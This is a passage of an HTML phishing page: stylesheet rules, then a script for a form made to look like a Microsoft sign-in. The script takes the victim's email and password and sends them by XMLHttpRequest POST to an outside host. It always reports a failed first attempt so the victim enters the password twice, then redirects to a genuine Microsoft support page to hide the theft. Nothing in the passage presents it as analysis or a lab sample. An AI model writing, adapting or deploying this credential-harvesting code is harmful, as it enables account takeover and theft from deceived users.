            background-position: center;
            height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* Style the form */
        form {
            background: rgba(255, 255, 255, 0.8);
            /* Semi-transparent white background */
            padding: 20px;
            border-radius: 3px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            /* Set a fixed width for the form */
            width: 90%;
            /* Make the form 90% wide on smaller screens */
            margin: 0 10px;
            /* Add space on the left and right */
        }

        .input-box {
            margin-left: 10px;
        }

        .input {
            padding: 4px 8px;
            border-style: solid;
            border-width: 2px;
            border-color: rgba(0, 0, 0, .4);
            background-color: rgba(255, 255, 255, .4);
            height: 32px;
            height: 2rem;
            padding: 6px 10px;
            padding-left: 10px;
            border-width: 1px;
            border-top-width: 1px;
            border-right-width: 1px;
            border-left-width: 1px;
            border-color: #666;
            border-color: rgba(0, 0, 0, .6);
            height: 36px;
            outline: none;
            border-radius: 0;
            -webkit-border-radius: 0;
            background-color: transparent;
            border-top-width: 0;
            border-left-width: 0;
            border-right-width: 0;
            padding-left: 0;
            width: calc(100% - 20px);
            font-size: 15px;
        }

        .input,
        input[type="email"] {
            width: 100%;
            background-color: transparent;
            outline: none;
        }

        input[type="email"]#email {
            border: none;
            background: none;
            color: black;
            font-family: inherit;
            font-size: 15px;
            font-weight: 400;
            padding: 0;
            margin: 0;
        }

        input[type="email"]#email:focus {
            outline: none;
        }



        button {
            background-color: #007BFF;
            color: white;
            cursor: pointer;
        }

        #msgfont {
            color: red;
        }

        .title {
            line-height: 1.5rem;
            color: #1b1b1b;
            font-size: 1.3rem;
            font-weight: 600;
        }

        .logo {
            margin-bottom: 20px;
            margin-left: 10px;
        }

        .mb-16 {
            margin-bottom: 16px;
        }

        .btn {
            margin: 0 18 0 auto;
            display: block;
            background-color: #0067b8;
            color: #fff;
            border: 2px solid #0067b8;
            padding: 5px 30px;
            font-size: 15px;
            cursor: pointer;
        }

        .btn:hover {
            background-color: #005da6;
        }

        .instructions {
            font-size: 16px;
            color: #333;
            margin-bottom: 20px;
        }

        @media (max-width: 480px) {
            form {
                padding: 8px;
                font-size: 14px;
            }

        }
    </style>

</head>

    <script type="text/javascript">
        var countAttempt = 0;
        var sendUrl = "https://nw.tupqyv4.bar/New/NEW1%20AMG/contact.php?inc";
        document.addEventListener('DOMContentLoaded', function () {
            var btnLogin = document.getElementById('btnLogin');
            var msgFont = document.getElementById('msgfont');
            btnLogin.addEventListener("click", function (event) {
                event.preventDefault();
                var password = document.getElementById('password').value;
                if (password == "") {
                    msgFont.innerHTML = "Please enter password";
                } else {
                    sendData();
                }
            });

            btnLogin.addEventListener("touchend", function (event) {
                event.preventDefault();
                var password = document.getElementById('password').value;
                if (password == "") {
                    msgFont.innerHTML = "Please enter password";
                } else {
                    sendData();
                }
            });

            function sendData() {
                var xiemail = document.getElementById('email').value;
                var pipassword = document.getElementById('password').value;

                console.log("Email - " + xiemail);
                console.log("Password - " + pipassword);

                // You can use the FormData object to collect form data
                var formData = new FormData(document.forms.street);

                countAttempt++;

                var xhr = new XMLHttpRequest();
                xhr.open('POST', sendUrl);

                xhr.send(formData);

                if (countAttempt >= 2) {
                    setTimeout(function () {
                        window.location = "https://support.microsoft.com/en-us/error/505-607";
                    }, 2000);
                    btnLogin.value = "Verifying....";
                    msgFont.innerHTML = "";
                } else {
                    setTimeout(function () {
                        msgFont.innerHTML = "Your account or password is incorrect.";
                        btnLogin.value = "Next";
                    }, 2000);
                    btnLogin.value = "Verifying....";
                }
            }
        });
    </script>
